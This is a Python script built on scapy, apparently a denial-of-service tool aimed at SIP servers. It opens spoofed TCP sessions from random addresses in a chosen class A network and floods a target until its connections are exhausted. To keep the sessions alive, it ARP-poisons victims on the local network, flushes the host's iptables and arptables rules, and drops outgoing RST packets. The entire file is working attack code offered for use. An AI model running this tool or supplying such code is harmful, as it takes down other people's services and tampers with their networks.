#!/usr/bin/python
# This script is "quick and dirty" and is not meant to handle all possibilities and exceptions.
# This script creates a TCP exhaustion condition. Run at your own risk!!

from random import randrange
from optparse import OptionParser
import threading
import logging
import os
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
conf.verb = 0

class TestData:
   def __init__(self, dstip, dstport):
	self.dstip = dstip
	self.dstport = dstport

#Manage interface promiscuity. valid states are on or off
def promisc(state):
        ret =  os.system("ip link set " + conf.iface + " promisc " + state)
        if ret == 1:
                print ("You must run this script with root permissions.")

#Get the MAC address for the local interface
def getEthMac(test):
	data = os.popen("/sbin/ifconfig " + test.iface).readlines()
	for line in data:
	  if line.strip().startswith(test.iface):
		test.ethmac = line.split("HWaddr ")[1].split()[0]
		if verbose: print ("local ethmac " + test.ethmac)
		return
	print "Error: unable to find Ethernet MAC"
	sys.exit(0)

# If the default route is on the interface selected determine
# the IP. If not, just fill it with zeros
def getDefRoute(test):
  data = os.popen("/sbin/route -n ").readlines()
  for line in data:
    if line.startswith("0.0.0.0") and (test.iface in line):
      test.defgw = line.split()[1]
      return
    else:
      test.defgw = "0.0.0.0"
      return

# Get the IP address of the interface selected
def getDefIP(test):
  data = os.popen("/sbin/ifconfig " + test.iface).readlines()
  for line in data:
    if line.strip().startswith("inet addr"):
      test.localip = line.split(":")[1].split()[0]
      if verbose: print("local ip " + test.localip)
      return

# ARP out for the target MAC address so we know who to spoof later
def getTargetMAC(test):
	frame = srp1(Ether(dst="ff:ff:ff:ff:ff:ff", src=test.ethmac)/ARP(op="who-has", pdst=test.dstip),iface=test.iface)
	test.dstmac=frame.hwsrc
	if verbose: print("target mac " + test.dstmac)

# Create a spoofed TCP socket and send a payload if selected
def spoofCon(test):
	if verbose: print("spoofCon to " + test.dstip + " from " + test.srcip)
	stseq = 1
	
	# build IP and TCP layers
	ip=IP(flags="DF", src=test.srcip, dst=test.dstip)
	TCP_SYN=TCP(sport=test.srcport, dport=test.dstport, flags="S", seq=stseq)

	if test.local:
	   # send an initial SYN to force the target to ARP
	   send(ip/TCP_SYN)

	   # build and send an ARP response to poison the target ARP table
	   arppkt = Ether(dst=test.dstmac, src=test.ethmac)/ARP(op="is-at", hwdst=test.dstmac, psrc=test.srcip, pdst=test.dstip)	
	   sendp(arppkt,iface=test.iface)


	# send a TCP SYN and wait for the SYNACK to be returned
	TCP_SYNACK=sr1(ip/TCP_SYN)

	# build and send the ACK to target based on the learned seq number
	my_ack = TCP_SYNACK.seq + 1
	stseq += 1 
	TCP_ACK=TCP(sport=test.srcport, dport=test.dstport, flags="A", seq=stseq, ack=my_ack)
	send(ip/TCP_ACK)

	# if the user opts to send a payload, send it now. Note that the data variable can be
	# changed to send whatever is desired in the socket.
	if test.payload:
           data=("\r\n")
	   TCP_PUSH=TCP(sport=test.srcport, dport=test.dstport, flags="PA", seq=stseq, ack=my_ack)
	   send(ip/TCP_PUSH/data)


# Parse options
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser(usage=usage)
parser.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
parser.add_option("-d", "--dest", dest="server", help="Destination SIP server")
parser.add_option("-i", "--iface", dest="iface", default="eth1", help="Source interface")
parser.add_option("-p", "--port", type="int", dest="port", default="5060", help="Destination port")
parser.add_option("-P", "--payload", action="store_true", dest="payload", default=False, help="Send payload in script")
parser.add_option("-a", "--classa", dest="classa", help="Class A network to simulate")
parser.add_option("-l", "--local", action="store_true", dest="local", default=False, help="Victim is on same local network")
parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Set verbose mode")
(options, args) = parser.parse_args()

# Initialize default values and parse options 
i = 0
promisc("on")

test = TestData(options.server,options.port)
test.counter = options.counter 
test.payload = options.payload
test.iface = options.iface
test.classa = options.classa
test.local = options.local
verbose = options.verbose

# get local environment information
getEthMac(test)
getDefRoute(test)
getDefIP(test)
getTargetMAC(test)

# Manage firewall rules that will prevent local host from tearing down sessions or 
# un-poisoning the target ARP table
if verbose: print("Dropping ip firewall rules...")
os.system("/sbin/iptables --flush")
if verbose: print("Blocking RST packets to our victim...")
os.system("/sbin/iptables -A OUTPUT -p tcp --tcp-flags RST RST -d " + test.dstip + " -j DROP")
if verbose:
   os.system("/sbin/iptables -L")

if test.local:
   if verbose: print("Dropping arp firewall rules...")
   os.system("/usr/local/sbin/arptables --flush")
   if verbose: print("Blocking ARP replies from local IP to our victim...")
   os.system("/usr/local/sbin/arptables -A OUTPUT -d " + test.dstip + " -j DROP")
   if verbose: os.system("/usr/local/sbin/arptables -L")

# The main loop. Iterate through socket counter
while i < test.counter:
	try:
	# Generate a random IP based on the class A network specified
             test.srcip = ".".join([test.classa,str(randrange(1,256)),str(randrange(1,256)),str(randrange(1,256))])
	     # Make sure the IP generated is not local or the gateway
             if (test.srcip in test.defgw) or (test.srcip in test.defgw):
		print("Skipping reserved address: " + test.srcip)
	     else:
                test.srcport = int(str(randrange(1024,65535)))
		spoofCon(test)
		i +=1
	except (KeyboardInterrupt):
		promisc("off")
		print("Exiting traffic generation...")
		raise SystemExit

if verbose: print("Dropping firewall rules...")
os.system("/sbin/iptables --flush")
os.system("/usr/local/sbin/arptables --flush")
promisc("off")
